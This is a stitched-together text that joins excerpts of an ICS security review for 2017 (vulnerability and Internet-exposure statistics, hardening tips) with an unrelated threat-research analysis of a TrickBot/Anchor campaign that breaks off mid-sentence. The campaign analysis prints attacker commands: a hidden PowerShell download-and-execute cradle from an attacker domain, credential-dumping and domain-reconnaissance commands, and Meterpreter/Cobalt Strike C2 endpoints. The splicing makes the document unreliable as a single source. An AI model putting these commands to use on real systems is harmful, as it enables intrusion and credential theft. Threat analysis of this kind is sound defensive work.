Loss of USD $300 million by shipping giant \nMaersk,1 interruptions in production at Renault and Nissan plants,2 and a ransomware attack on \nthe San Francisco public transit system3 are only a few recent examples that have made headlines.\n\nSecuring industrial control systems (ICS) is a critical factor in ensuring the overall information se-\ncurity of critical facilities and infrastructure. Many efforts have been made to promote ICS secu-\nrity: governments are developing regulatory frameworks, computer emergency response teams \n(CERT) are issuing bulletins, and ICS vendors are gaining awareness that vulnerabilities in their \nproducts can cause loss of lucrative contracts4 and even lives.\n\nDespite these efforts—and in the face of mounting incident costs and concern—security at most \nindustrial facilities has shown minimal improvement since the Stuxnet attacks of 2010, as illustrat-\ned in this report.\n\nThe problem is worsened by the tendency to connect ICS equipment to the Internet, which is \nlikely to intensify with the advent of the Fourth Industrial Revolution. Such connections set the \nstage for attacks by hackers from anywhere in the world, even without direct physical access to \ntarget equipment.\n\nNowadays, almost any advanced Internet user can look up the IP addresses of network equipment \nused on ICS networks (such as switches, interface converters, and gateways) with the help of pub-\nlicly available search engines. When this equipment is hacked, building systems and operations \nare at high risk. In 2017, we found that vulnerabilities in such equipment are becoming an increas-\ningly common occurrence.5\n\nThis report, our fourth on the subject, describes findings by Positive Technologies regarding vul-\nnerabilities in ICS components and their prevalence on Internet-connected systems, and how this \nsituation has evolved over recent years.\n\nABBREVIATIONS USED\n\nDCS—distributed control systems\n\nHMI—human–machine interface\n\nICS—industrial control system\n\nLAN—local area network\n\nPLC—programmable logic controller\n\nRAP—remote access point\n\nRTU—remote terminal unit\n\nSCADA—supervisory control and data acquisition\n\n1  bloomberg.com/news/articles/2017-08-16/maersk-misses-estimates-as-cyberattack-set-to-hurt-third-quarter\n\n2  businessinsider.com/renault-nissan-production-halt-wannacry-ransomeware-attack-2017-5\n\n3  theguardian.com/technology/2016/nov/28/passengers-free-ride-san-francisco-muni-ransomeware\n\n4  In December 2017, oil transporter Transneft announced that it would cease use of Schneider Electric equipment due to multiple \nvulnerabilities jeopardizing the company’s cybersecurity\n\n5  Examples of attacks leveraging network equipment will be described in a separate report, which will be released at a later date \non ptsecurity.com\n\nhttps://www.bloomberg.com/news/articles/2017-08-16/maersk-misses-estimates-as-cyberattack-set-to-hurt-third-quarter\nhttp://www.businessinsider.com/renault-nissan-production-halt-wannacry-ransomeware-attack-2017-5\nhttps://www.theguardian.com/technology/2016/nov/28/passengers-free-ride-san-francisco-muni-ransomeware\nhttp://www.ptsecurity.com\n\n\nICS SECURITY:  \n2017 IN REVIEW\n\n4\n\nVULNERABILITIES IN ICS COMPONENTS\n\nResearch methodology\n\nInformation was drawn from publicly available sources, such as vulnerability knowledge bases, \nvendor advisories, exploit databases and packs, research papers, and posts on security websites \nand blogs.6\n\nThe following vulnerability knowledge bases were used:\n\n+\t ICS-CERT (ics-cert.us-cert.gov)\n+\t NVD (nvd.nist.gov), CVE (cve.mitre.org)\n+\t Positive Research Center (securitylab.ru/lab)\n+\t Schneider Electric Cybersecurity Support Portal7\n\n+\t Siemens Product CERT (siemens.com/cert)\n\nThe severity of vulnerabilities in ICS components was assessed based on the Common Vulnerability \nScoring System (CVSS) version 3 (first.org/cvss).\n\nOur assessment of disclosed vulnerabilities did not attempt to cover every single vendor of indus-\ntrial automation equipment, instead focusing on larger and more prominent companies.\n\nTrends\n\nThe number of new vulnerabilities disclosed in 2017 increased compared to the prior year. As of \npublication of this report, information about 197 vulnerabilities of major manufacturers had been \npublished. However, this number could still increase due to responsible disclosure policies, since \nvulnerabilities often are not published until after they have been fixed. For example, 30 vulnerabil-\nities in Moxa equipment were detected in 2016 but disclosed only in 2017. \n\nVulnerabilities by vendor\n\nThe top spots saw a reversal of positions. The previous leader, Siemens, yielded first place to \nSchneider Electric, whose 47 component vulnerabilities disclosed in 2017 exceeded the compa-\nny’s total for 2016 (5) by almost ten times. Also notable is the increased number of security flaws in \nMoxa industrial network equipment, with twice as many (36) as in the previous year (18). \n\n6  digitalbond.com, scadahacker.com, immunityinc.com/products/canvas, exploit-db.com, rapid7.com/db\n\n7  schneider-electric.com/b2b/en/support/cybersecurity/report-an-incident.jsp\n\nNumber of new vulnerabilities found in ICS components\n\n0\n\n2013\n\n2014\n\n2015\n\n2016\n\n25 50 75 100 125 150 175 200 225\n\n158\n\n181\n\n212\n\n115\n\n2017\n\n197\n\nhttp://ics-cert.us-cert.gov\nhttp://nvd.nist.gov\nhttp://cve.mitre.org\nhttp://securitylab.ru/lab\nhttp://siemens.com/cert\nhttp://first.org/cvss\nhttp://digitalbond.com\nhttp://scadahacker.com\nhttp://immunityinc.com/products/canvas\nhttp://www.exploit-db.com\nhttp://rapid7.com/db\nhttp://schneider-electric.com/b2b/en/support/cybersecurity/report-an-incident.jsp\n\n\nICS SECURITY:  \n2017 IN REVIEW\n\n5\n\nVulnerabilities by component type \n\nThe core trend we see is the growing number of new vulnerabilities in industrial network equip-\nment.

To obtain the research materials, we scanned ports of Internet-accessible \ncomponents using publicly accessible search engines: Google, Shodan (shodan.io), and Censys \n(censys.io).\n\nPassive techniques for gathering data about the Internet accessibility of ICS components have \nseveral limitations:\n\n+\t Shodan scans a limited number of ports and performs scanning of the Internet from specific IP \naddresses, which are blacklisted by some firewall vendors and administrators. Therefore, data \nfrom Google and Censys was used to expand the scope of assessment.\n\n+\t In many cases, it was not possible to determine product versions, because the necessary infor-\nmation was not given in the banners returned by host servers.\n\nThis data was then specially analyzed to identify which results corresponded to ICS equipment. \nOur experts created a database of ICS identifiers for determining product and vendor based on a \ndevice’s banner.\n\nhttp://shodan.io\nhttp://censys.io\n\n\nICS SECURITY:  \n2017 IN REVIEW\n\n8\n\nPrevalence \n\nThe research revealed 175,632 ICS components accessible online.\n\nLooking at the protocols used by the detected ICS components, the most common protocol was \nHTTP, which is consistent with recent years. The Fox protocol was also very popular: it is used \nin Niagara Framework products and most commonly seen in automation systems for buildings, \nfacilities, and data centers.

The number of \ndetected ICS components grew \nfrom 591 in 2016 to 892 in 2017. \nThese changes suggest a growing \ndanger caused by an increasing \nnumber of Internet-accessible ICS \ncomponents located in Russia.\n\nNumber of Internet-accessible ICS components, by country\n\nOther\n\nHong Kong\n\nBrazil\n\nSweden\n\nNorway\n\nSouth Korea\n\nBelgium\n\nAustralia\n\nCzech Republic\n\nNetherlands\n\n0 10,000 20,000 30,000 40,000 50,000 60,000 70,000\n\nSpain\n\nChina\n\nItaly\n\nCanada\n\nFrance\n\nGermany\n\nUnited Kingdom\n\n42,077\n\n1,938\n\n1,990\n\n2,118\n\n2,314\n\n2,483\n\n2,494\n\n2,705\n\n2,851\n\n4,112\n\n4,285\n\n5,858\n\n7,371\n\n7,759\n\n13,242\n\nUnited States\n\n64,287\n\n4,240\n\n3,508\n\nGeographic distribution \n\nThe U.S. has held the top spot for some years now, increasing its commanding lead of Internet-\naccessible components by 10% in the last year to around 42% of the total. Germany took second \nplace (6%), the same as in the previous year. Rounding out the top three is France (5%); China fell \nfrom third to sixth place. \n\n\n\nICS SECURITY:  \n2017 IN REVIEW\n\n10\n\nStatistics: vendors and products\n\nFirst place is occupied by Honeywell, the owner of Tridium and Niagara Framework. Some Niagara \nproducts retain their old brand, which is why Tridium is listed separately from Honeywell in this \nreport.\n\nThe second most popular vendor is Lantronix. This California-based company manufactures de-\nvices designed to provide remote access to equipment via the Internet.\n\nAccording to recent research,11 several thousand Lantronix interface converters are accessible on \nthe Internet. Almost half of these devices expose passwords that could be used to connect via \nTelnet. Our research confirms this fact: we detected 12,120 accessible Lantronix devices in total, a \nnumber of which were vulnerable.\n\nDespite their auxiliary role, these devices can pose a significant hazard to operations when connect-\ned to the Internet. Interface converters connect ICS components to each other, so any malfunction \nor failure on their part can cause loss of remote control and management. For example, during a cy-\nberattack on the Ukrainian energy grid,12 the attackers remotely disrupted the functioning of Moxa \nconverters. As a result, utility operators could no longer connect to field devices at substations or \nremotely control substation switches.\n\nAs in prior years, Niagara Framework is the software most commonly found on Internet-accessible \nequipment. Apart from Lantronix interface converters, which hold second place, Moxa converters \nare also close to the top.\n\n11  bleepingcomputer.com/news/security/thousands-of-serial-to-ethernet-devices-leak-telnet-passwords/\n\n12  boozallen.com/content/dam/boozallen/documents/2016/09/ukraine-report-when-the-lights-went-out.pdf\n\nNumber of Internet-accessible ICS components, by vendor\n\nSpiderControl\n\nSoftPLC\n\nWAGO\n\nSofrel Lacroix\n\nBosch\n\nWestermo\n\n3S-Smart Software Solutions\n\nEchelon\n\nTridium\n\n0 5,000 10,000 15,000 20,000 25,000 30,000\n\nMoxa\n\nRockwell Automation\n\nSiemens\n\nBeck IPC\n\nSMA\n\nLantronix\n\nHoneywell\n\nSchneider Electric\n\n1,121\n\n1,160\n\n1,267\n\n1,619\n\n1,672\n\n1,850\n\n2,156\n\n2,437\n\n2,672\n\n4,232\n\n4,759\n\n5,594\n\n6,069\n\n9,362\n\n9,399\n\n12,120\n\n26,813\n\nhttps://www.bleepingcomputer.com/news/security/thousands-of-serial-to-ethernet-devices-leak-telnet-passwords/\nhttp://boozallen.com/content/dam/boozallen/documents/2016/09/ukraine-report-when-the-lights-went-out.pdf\n\n\nICS SECURITY:  \n2017 IN REVIEW\n\n11\n\nInternet-accessible ICS components, by product\n\nNiagara AX station\n\nNiagara Web\n\nWebRTU\n\nSofrel S500\n\nWestermo MRD-310\n\nBosch Security Systems\n\n3S-Smart Software Solutions Device\n\ni.LON SmartServer\n\nSiemens Building Technologies HMI Panel\n\nMoxa Nport\n\n0 5,000 10,000 15,000 20,000 25,000 30,000\n\n1,300\n\n1,372\n\n1,383\n\n1,619\n\n1,647\n\n1,672\n\n1,953\n\n2,220\n\n4,310\n\n4,589\n\nAllen-Bradley Device\n\n4,906\n\nIPC@CHIP\n\n9,362\n\nSunny WebBox\n\n9,399\n\nLantronix Serial Converter\n\n9,937\n\nNiagara Framework\n\n24,858\n\nTypes of ICS components\n\nThe distribution of Internet-accessible components by types remained almost the same.

More than half of the detected vulnerabilities are of critical or high severity. \n\nThe number of Internet-accessible ICS components is growing. The majority of them were detect-\ned in the countries with the highest levels of industrial automation (U.S., Germany, France, Canada, \nItaly, and China).\n\nAn increase in the number of known vulnerabilities and Internet-accessible ICS components allows \nattackers to conduct a wider range of attacks, which can cause very tangible impacts. Responding \nto sophisticated attacks on ICS components requires large amounts of preparation and planning. \nBefore the first line of code is ever written, ICS developers must design the security mechanisms \nnecessary to protect ICS components from attacks.\n\nTo identify potential attack vectors and develop an effective protection system, companies should \nperform regular ICS security audits and deploy industrial cybersecurity incident management \nsolutions.\n\nAs always, observing the following basic security guidelines goes a long way toward ensuring \nprotection:\n\n+\t Segregate ICS operational networks from the enterprise LAN and external networks.\n+\t Limit physical access to ICS networks and components.\n+\t Enforce a strict password policy.\n+\t Properly configure network equipment and firewall filtering rules.\n+\t Protect privileged accounts.\n+\t Minimize privileges of users and services.\n+\t Use antivirus software.\n+\t Regularly install updates to operating systems and applications.\n\nICS_Security_A4.ENG.0002.02.JAN.26.2018\n\ninfo@ptsecurity.com ptsecurity.com\n\nAbout Positive Technologies\n\nPositive Technologies is a leading global provider of enterprise security solutions for vulnerability and compliance \nmanagement, incident and threat analysis, and application protection.

Similar to attacks previously reported by Cybereason, this campaign started with a TrickBot infection and progressed into a\nhacking operation targeting sensitive financial systems.\n\nHowever, unlike previous operations that focused on causing a massive ransomware infection (Ryuk and LockerGoga) by compromising\ncritical assets like the domain controller, this new operation is focused on targeting point of sale (PoS) systems. The campaign leverages a\nnewly discovered malware family called Anchor exclusively for high-profile targets.\n\nLearn more about additional attacks that leverage TrickBot.\n\nThis research focuses on the following aspects of the TrickBot-Anchor attack:\n\n1. Anatomy of the Attack: A step-by-step anatomy of the attacks, including infection vectors and a dissection of the tools and techniques\nused by the attackers.\n\n2. New Malware: The discovery of a new malware family called Anchor, which includes the Anchor_DNS and a new, undocumented\nAnchor that has been operating since August 2018 (and potentially even earlier). The Anchor malware is a backdoor used very\nselectively on high-profile targets, and appears to be tightly connected to TrickBot, potentially even authored by the same individuals who\ncreated TrickBot.\n\nWhile this blog does not discuss attribution explicitly, the nature of these attacks, specifically the motivation, some of the tools and techniques\ndetailed,  have certain resemblance to past attacks that were linked to the financially-motivated FIN6 threat actor, a group that is known to\ntarget POS systems and has been linked to TrickBot infections in the past.\n\nhttps://www.cybereason.com/blog/triple-threat-emotet-deploys-trickbot-to-steal-data-spread-ryuk-ransomware\nhttps://attack.mitre.org/software/S0266/\nhttps://www.cybereason.com/blog/triple-threat-emotet-deploys-trickbot-to-steal-data-spread-ryuk-ransomware\nhttps://www.fortinet.com/blog/threat-research/lockergoga-ransomeware-targeting-critical-infrastructure.html\nhttps://www.cybereason.com/blog/triple-threat-emotet-deploys-trickbot-to-steal-data-spread-ryuk-ransomware\nhttps://technical.nttsecurity.com/post/102fsp2/trickbot-variant-anchor-dns-communicating-over-dns\nhttps://attack.mitre.org/groups/G0037/\nhttps://usa.visa.com/dam/VCOM/global/support-legal/documents/fin6-cybercrime-group-expands-threat-To-ecommerce-merchants.pdf\nhttps://www.zdnet.com/article/cybercrime-group-fin6-evolves-from-pos-malware-to-ransomware/\n\n\n3/25\n\nLastly, our blog emphasizes the gravity and danger that lies in commodity malware infections, as they have the potential of escalating into a\nhacking operation. This can easily lead to a disastrous outcome, whether it be a ransomware infection or theft of sensitive financial data.\n\nKey Points\n\nThe TrickBot-Anchor Operation: Cybereason Nocturnus is investigating a series of targeted attacks against financial, manufacturing,\nand retail businesses across the United States and Europe.\nTargets POS Systems: The attacks target POS systems to steal sensitive information by taking over critical assets in the victims’\nnetwork.\nDeploys A Backdoor on High-value Targets: On certain high-profile targets, the attackers selectively use a new variant of the rare\nAnchor_DNS tool. Anchor_DNS is a backdoor that uses the DNS protocol to stealthily communicate with C2 servers.\nUses a New, Undocumented Malware: In addition to the new Anchor_DNS variant, the attackers use a completely new and previously\nundocumented malware dubbed Anchor. Anchor has been in operation since August 2018 and appears to be tightly related to TrickBot.\nAdds Enhancements to TrickBot: This attack adds a new and enhanced stealing module to TrickBot that focuses on stealing\npasswords from various products, including the KeePass password manager.\nUses Known Tools for Reconnaissance and Lateral Movement: The majority of the initial interactive hacking operation uses the\nknown tools Meterpreter, PowerShell Empire, and Cobalt Strike for reconnaissance and lateral movement.\nAbuses the Trust of Certificate Authorities: Many of the payloads in the attacks are signed binaries, which demonstrates the ever-\ngrowing trend of signed threats that abuse the trust of certificate authorities to bypass detection.\n\nTable of Contents\n\nAnatomy of the Attack: A Step-by-Step Analysis\n\nAn overview of the attack tree, as seen in the Cybereason Defense Platform.\n\nInfection Vector\n\nDownloading and injecting TrickBot.\n\nThe attack starts with a phishing email that contains a malicious link to a file hosted on Google Docs named “Annual Bonus Report.doc”. When\nthe user clicks on the link, the TrickBot dropper downloads onto the target machine. This differs from previous TrickBot attacks we have seen,\nwhere TrickBot is usually dropped through a Microsoft Office document or by another malware like Emotet.\n\nhttps://technical.nttsecurity.com/post/102fsp2/trickbot-variant-anchor-dns-communicating-over-dns\nhttps://keepass.info/\nhttps://github.com/rapid7/metasploit-framework/wiki/Meterpreter\nhttps://github.com/EmpireProject/Empire\nhttps://www.cobaltstrike.com/\nhttps://medium.com/@chroniclesec/abusing-code-signing-for-profit-ef80a37b50f4\nhttps://www.cybereason.com/blog/triple-threat-emotet-deploys-trickbot-to-steal-data-spread-ryuk-ransomware\n\n\n4/25\n\nPhishing email that tricks the user into downloading TrickBot.\n\nThe TrickBot Downloader\n\nThe campaigns use a TrickBot downloader that is signed and uses an icon to pretend it is a Microsoft Word document. When the user double-\nclicks the file, they are presented with a decoy message box. To avoid suspicion, the decoy message suggests the user should update\nMicrosoft Word or open the file from another computer.\n\nTrickBot displays a message box suggests updating Microsoft Word or opening the file on another computer to preview the document.\n\nWhile at first glance these files can be mistaken for legitimate Microsoft Word files, a closer inspection of the file metadata indicates they are\nnot associated with Microsoft Word, nor are they Microsoft Word document files.\n\nMost of the initial payloads in these campaigns are signed with valid certificates to evade security tools. They abuse the relative trust that is\ngiven to signed binaries to avoid detection.\n\nFile metadata properties for the fake Microsoft Word Document.\n\n\n\n5/25\n\nSigned malware is an evasive initial entry point into an organization.\n\nThe message box distracts the user as TrickBot’s payload is downloaded, stored in the %TEMP% folder, and executed. A new process injects\nthe TrickBot payload into a svchost.exe process.\n\nsvchost.exe injected code malicious evidence as seen in the Cybereason Platform.\n\n \nDomain associated with the TrickBot payload download.\n\nThe TrickBot Payload\n\nOnce TrickBot’s main payload is injected into the svchost.exe process, it carries out a series of reconnaissance-related tasks to profile the\ninfected endpoint and the network. This information is crucial, as it determines the course of the attack.\n\nChecking Network Connectivity\n\nTrickBot checks for Internet connectivity by trying to access several designated domains. These domains are preconfigured and belong to\nlegitimate web services, including: checkip.amazonaws.com, ipecho.net, ipinfo.io, api.ipify.org, icanhazip.com, myexternalip.com,\nwtfismyip.com, ip.anysrc.net.\n\n\n\n6/25\n\nOnce TrickBot verifies it can connect to the Internet, it communicates with C2 servers, some of which using TOR-related domains. It collects\nand sends information about where the target machine is located to the C2 servers.\n\nBrowser History and Credential Theft\n\nAfter TrickBot establishes Internet access and sends information about the location of the target machine, it starts its malicious activity. The\nmodule core-parser.dll is reflectively loaded into svchost.exe. core-parser.dll parses the TrickBot config files and extracts IP addresses for\nsecondary C2 communication, redirection, and web injection logic.\n\ncore-parser.dll injected into svchost.dll.\n\nTrickBot sends the reconnaissance information from the target machine to a hardcoded C2 server. The C2 server is responsible for handling\nthe stolen data.\n\nhttps://www.fortinet.com/blog/threat-research/deep-analysis-of-trickbot-new-module-pwgrab.html\n\n\n7/25\n\nA list of C2 servers extracted from TrickBot’s configuration.\n\nTrickBot also steals data from Internet Explorer by executing the built-in Windows tool ESENTUTL using the living-off-the-land technique\n(LOLBin).\n\nesentutl /p /o C:\\Users\\[USER]\\AppData\\Local\\Temp\\grabber_temp.edb\n\nThis command dumps the Extensible Storage Engine (ESE) database format.\n\nApplication-specific Credential Theft\n\nThis variant of TrickBot employs a new, unique ability to steal passwords from KeePass, a free, open- source password manager. TrickBot's\nKeePass stealing capabilities seem to be inspired (or even partially copy-pasted) from a publicly available tool dubbed PoshKPBrute, a script\nthat performs a dictionary attack against KeePass .kdbx files. Once it finds the dictionary key, it dumps all passwords as an output and sends\nthe attackers the master password.\n\nhttps://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/hh875546(v%3Dws.11)\nhttps://www.sneakymonkey.net/2019/10/29/trickbot-analysis-part-ii/\nhttps://keepass.info/\nhttps://github.com/wevans311082/PoshKPBrute\n\n\n8/25\n\nKeePass stealing brute force tool.\n\nTrickBot’s stealer module also tries to extract keys from Filezilla, OpenSSH and OpenVPN.\n\nTrickBot attempting to steal keys from Filezilla, OpenSSH, and OpenVPN.\n\nReconnaissance Commands\n\nIn addition to several crafted PowerShell commands, the attackers use several legitimate Windows processes to gather information, including\nnltest.exe, net.exe, ipconfig.exe, whoami.exe, and nslookup.exe. They gather information on:\n\nAll trusted domains, domains, and domain controllers\nA list of computers and network devices on the network\nThe infected machine user and groups the user belongs to\nThe infected machine, including machine name, operating system, workstation domain, and more information\nNetwork adapters that have connected to the machine and DNS servers\n\nhttps://filezilla-project.org/\nhttps://www.openssh.com/\nhttps://openvpn.net/\n\n\n9/25\n\nThe net.exe process tree.\n\nNltest / domain_trusts /all_trusts\n\nNet view /all\n\nNltest /domain_trusts\n\nNet view /all /domain\n\nIpconfig /all\n\nNet config workstation\n\nNslookup “-q=srv_kerberos._tcp”\n\n/c “start microsoft-edge:http://127.0.0.1:52715/11984”\n\nReconnaissance commands launched by TrickBot.\n\nThe attacker also uses PowerShell to test DNS entry settings. They use the command -q=srv_kerberos_tcp on the process nslookup.exe to\nopen an interactive shell. They use the shell to expand their search to other machines on the network by searching for things like a list of the\ndomain controllers.\n\nTrickBot testing DNS settings.\n\nWith this in mind, we gather that the attackers goal is to spread within organizations to multiple machines, not just to the target machine.\n\nFrom TrickBot Infection to Interactive Hacking\n\nThe threat actor evaluates information sent back to the C2 server and identifies if they have successfully infected a high-value target. If so,\nthey escalate their efforts by switching to interactive hacking: reconnaissance, credential dumping, lateral movement, and in some cases the\nmass deployment of ransomware across endpoints connected to the domain controller.\n\nPowerShell Payloads\n\nThe threat actor leverages PowerShell to send additional payloads to the target machine. They issue commands to fetch a payload from a\nsecondary server and, once it’s downloaded, immediately execute it on the target machine through PowerShell.\n\n\n\n10/25\n\npowershell.exe -nop -WindowStyle Hidden -executionpolicy bypass -c \"IEX ((new-object\nnet.webclient).downloadstring('hxxps://northracing[.]net/?a=irs&x=[base64]'))\"\n\nThe northracing[.]net URL contains a PowerShell script in the contents of the webpage. Though we were unable to fetch the script used in this\nspecific incident, we were able to pivot off the query parameters used in the above PowerShell script (?a=irs&x=) to find a sandbox report for\nsimilar activity. The PowerShell payload runs two stages: the first stage sends basic information to the C2 domain and waits for a response to\nsee if it should continue its operation. If the threat actor does not send a stop flag, the PowerShell script runs in a constant loop and\ncontinuously POSTs data to the same domain the payload was fetched from. Each POST request is sent along with a UUID generated from\nthe user’s hostname and the current process ID.\n\nInformation sent along each POST request in the payload.\n\nA POST request containing basic information about the machine is sent, which includes the current user and their domain, the root of the file\nsystem, and information about the operating system.\n\nhttps://any.run/report/daf223b923f335c3de66cae8a091063361262669c8f9acaf59a352b1e0e07b8c/b92f9889-00f9-429d-97e4-fb149cfe66db\nhttps://app.any.run/tasks/b92f9889-00f9-429d-97e4-fb149cfe66db/\n\n\n11/25\n\nThe PowerShell payloads using WMI to probe for system information.\n\nThis information is sent to the C2 along with the `i` parameter. When a response is received, the payload checks to see if the response\nmatches the value cex01. If it does, the PowerShell script stops executing and kills the task. If the response is any other value, the script sets a\ntimeout variable based on the response and continues to the main loop.\n\nThis indicates that the attacker is either looking to target specific Windows domains or specific operating system versions.\n\nThe main loop sends a POST request to the server with the `t` parameter, which requests the next commands from the server.\n\nThe main loop that sends a POST request to the server.\n\n\n\n12/25\n\nEach line in the response from the threat actor contains a Base64-encoded command, which is decoded and then immediately executed using\nPowerShell through the Invoke-Expression (IEX) commandlet. The output of the command is sent back to the C2 server using a POST request\nwith the “a” parameter.\n\nMeterpreter & Cobalt Strike Implants\n\nThe attack tree demonstrating the beginning of the hacking operation using Meterpreter.\n\nMeterpreter Implant\n\nThe attackers use a Meterpreter implant to carry out post-exploitation actions. The Cybereason Platform detects both the shellcode and\nvarious Meterpreter DLLs reflectively loaded to memory. The detected DLLs include:\n\nMetsrv.dll: For Meterpreter, where the protocol and extension systems are implemented\nExt_server_priv.x86.dll: For privilege escalation\nExt_server_stdapi.x86.dll: A metasploit post exploitation module used for reconnaissance\n\nCybereason detects the reflectively loaded malicious modules as a Meterpreter agent and shellcode executed by the Meterpreter agent.\n\nExamining the loaded modules shows which Metasploit modules are loaded.\n \n\n \n\nThe Meterpreter agent creates a connection to port 4444 on the external IP address 91.12.89[.]129.\n\nCobalt Strike Implant\n\nUsing Meterpreter, the attackers injected Cobalt Strike and other Metasploit payloads into the rundll32.exe process.\n\nhttps://github.com/rapid7/metasploit-framework/wiki/Meterpreter\nhttps://www.cobaltstrike.com/\nhttps://www.metasploit.com/\n\n\n13/25\n\nAttackers injecting Cobalt Strike and other Metasploit payloads into the rundll32.exe process.\n\nDetection of Cobalt Strike, Meterpreter, and shellcode execution.\n\nThe attacker uses the following metasploit modules:\n\next_server_extapi.x86.dll: Obtains clipboard data and manipulates and decrypts the NTDS file\next_server_priv.x86.dll: Performs privilege escalation\nExt_server_stdapi.x86.dll: Performs reconnaissance activity\nBypassuac.x64.dll: A post-exploitation module used to bypass User Account Control\n\nPost-exploitation modules reflectively loaded to rundll32.exe\n\nhttps://blog.rapid7.com/2015/03/25/stageless-meterpreter-payloads/\n\n\n14/25\n\nThe connection to the external IP address 199.217.115[.]53 on port 8443.\n\nBoth Meterpreter and Cobalt Strike are legitimate penetration testing tools that have been repeatedly used by various threat actors, including\nthe FIN6 threat actor.\n\nActive Directory Discovery using Cobalt Strike\n\nThe threat actor uses known Cobalt Strike modules to enumerate Active Directory information:\n\nhttps://github.com/killswitch-GUI/CobaltStrike-ToolKit/blob/master/Invoke-DACheck.ps1\nhttps://github.com/killswitch-GUI/CobaltStrike-ToolKit/blob/master/Initial-LAdminCheck.cna\n\nThe attackers execute several Base64-encoded PowerShell commands in order to determine if the infected machine’s user is in the admin or\ndomain admin group.\n\nAfter verifying the user is an admin, the threat actor gathers information about the domain controllers and their IP addresses using an\nadditional Base64-encoded and compressed PowerShell command.\n\nThe obfuscated and compressed PowerShell command.\n\nThe decoded PowerShell command that attempts to gather domain controller information.\n\nActive Directory Discovery using ADfind\n\nThe attackers deploys a batch script that executes the ADfind.exe tool to enumerate users, groups, and computers of the Windows domain.\n\nadfind.exe -f \"(objectcategory=organizationalUnit)\"\n\nadfind.exe -gcb -sc trustdmp\n\nadfind.exe -f \"objectcategory=computer\"\n\nadfind.exe -sc trustdmp\n\nadfind.exe -f \"(objectcategory=person)\"\n\nadfind.exe -subnets -f (objectCategory=subnet)\n\nadfind.exe -f \"(objectcategory=group)\"\n\nThe ADfind tool has reportedly been used previously in attacks related to FIN6.\n\nNew Anchor_DNS Variant Discovered\n\nOne of the most interesting payloads in these attacks is the Anchor_DNS malware, which was originally discovered in October 2019 by NTT\nSecurity. It is classified by NTT as a variant of the infamous TrickBot malware, which uses DNS tunneling to stealthily communicate with C2\nservers. Though this variant was first discovered in October 2019, there is evidence that Anchor_DNS was used as far back as March 2019.\\\n\nhttps://attack.mitre.org/groups/G0037/\nhttps://github.com/killswitch-GUI/CobaltStrike-ToolKit/blob/master/Invoke-DACheck.ps1\nhttps://github.com/killswitch-GUI/CobaltStrike-ToolKit/blob/master/Initial-LAdminCheck.cna\nhttp://www.joeware.net/freetools/tools/adfind/\nhttps://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html\nhttps://technical.nttsecurity.com/post/102fsp2/trickbot-variant-anchor-dns-communicating-over-dns\n\n\n15/25\n\nOldest Anchor_DNS sample observed, SHA-1: b388243bf5899c99091ac2df13339f141659bbd4\n\nThis new variant acts as a sophisticated, stealthy backdoor that selectively chooses high-profile targets. Anchor_DNS is still undergoing rapid\ndevelopment cycles with code changes and new feature updates every few weeks.\n\nThis is a new variant of Anchor_DNS that appeared as early as November 2019 and exhibits the following changes in code and behavior:\n\nNo self-deletion mechanism shown in previous samples\nNo internet connectivity checks using legitimate online web services\nA built-in capability to check for C2 availability using ICMP (ping)\nAdditional partial string encryption and code obfuscation\n\nStatic Analysis Observations\n\nFile name SHA-1\n\nanchorDNS_x64.exe 5f1ad1787106de9725005d8da33d815d0994ee83\n\nanchorDNS_x64.exe contains a PDB path with the name of the malware, Anchor_DNS. This file is the 64-bit version of Anchor_DNS, however,\nthere were earlier instances of the 32-bit version as well. The project name shows that this is the fifth version of Anchor_DNS.\n\n`PDB PATH: C:\\simsim\\anchorDNS.v5\\Bin\\x64\\Release\\anchorDNS_x64.pdb\n\nMany strings in the code have typos and grammatical mistakes, further affirming our suspicion that the authors of Anchor_DNS are not native\nenglish speakers.\n\nMultiple typos and grammatical mistakes in the Anchor_DNS code.\n\nThe threat actor gave considerable effort to obfuscating the code of this new Anchor_DNS variant using stack strings, string encryption, and by\nimplementing a packer. The following example shows considerable changes in the code of the WinMain() function between an older variant of\nAnchor_DNS and the new variant.\n\n\n\n16/25\n\nAnchor_DNS was able to stay under-the-radar by using specific execution flags. If these command-line arguments are not supplied, the\nAnchor_DNS terminates.\n\n-i flag:\ncreates a scheduled task with the following naming convention (e.g “Notepad++ autoupdate#94654”): [random folder name in\n%APPDATA%] autoupdate#[random_number]\n\n \n\n \n\nWrites NTFS ADS files ($TASK, $GUID, $FILE)\n\nAlternate Data\nStream\n\nADS Contents Decoded Contents\n\nedskype.exe:$FILE QzpcVXNlcnNcdXNlclxBcHBEYXRhXFJvYW1pbmdcU2t5cGVcZWRza3lwZS5leGU= C:\\Users\\user\\AppData\\Roaming\\S\n\nhttps://blogs.technet.microsoft.com/askcore/2013/03/24/alternate-data-streams-in-ntfs/\n\n\n17/25\n\nedskype.exe:$TASK  \nTm90ZXBhZCsrIGF1dG91cGRhdGUjOTQ2NTQ\n\n \nNotepad++ autoupdate#94654\n\nedskype.exe:$GUID [BASE64] /anchor_dns/[COMPUTER_NAME]\n[clientID]/\n\n-u flag:\nNew Variant: executes the malware’s main communication module with the C2\nOld Variant:\n\nDrops a copy in %TEMP%\nCreates ADS files ($GUID, $FILE)\n\n-s flag: appears only on older versions of Anchor_DNS and runs the program without creating persistence and self-deletes once done.\n--log=: expects a file name to write log file in C:\\Users\\[USER]\n\nContents of the debug file created by Anchor_DNS.\n\nC2 Communication\n\nOlder and newer versions of Anchor_DNS communicate over DNS. However, the newer version described here does not check Internet\nconnectivity using legitimate online web services like ipinfo.io, and instead uses a built-in capability to check for the server’s availability using\nthe ICMP protocol.\n\nDetermining C2 server connectivity.\n\nDNS Tunneling\n\nAnchor_DNS communicates with the C2 servers over DNS using DNS Tunneling. With this technique, Anchor_DNS can transfer data, receive\ncommands, and download an additional payload, as detailed in NTT Security’s report on an older Anchor_DNS sample.\n\nBy implementing DNS Tunneling, Anchor_DNS can evade certain security products that might block certain network protocols or overlook DNS\ntraffic.\n\nhttps://www.sans.org/reading-room/whitepapers/dns/detecting-dns-tunneling-34152\nhttps://technical.nttsecurity.com/post/102fsp2/trickbot-variant-anchor-dns-communicating-over-dns\n\n\n18/25\n\nExample of DNS Tunneling traffic generated by Anchor_DNS.\n\nDiscovery of The Anchor Malware and Its Connection to TrickBot\n\nDuring our investigation, we found several unidentified malware samples related to TrickBot infections. The malware is dubbed Anchor by its\nauthors and has been active since August 2018. Unlike Anchor_DNS, the Anchor malware does not implement communication over 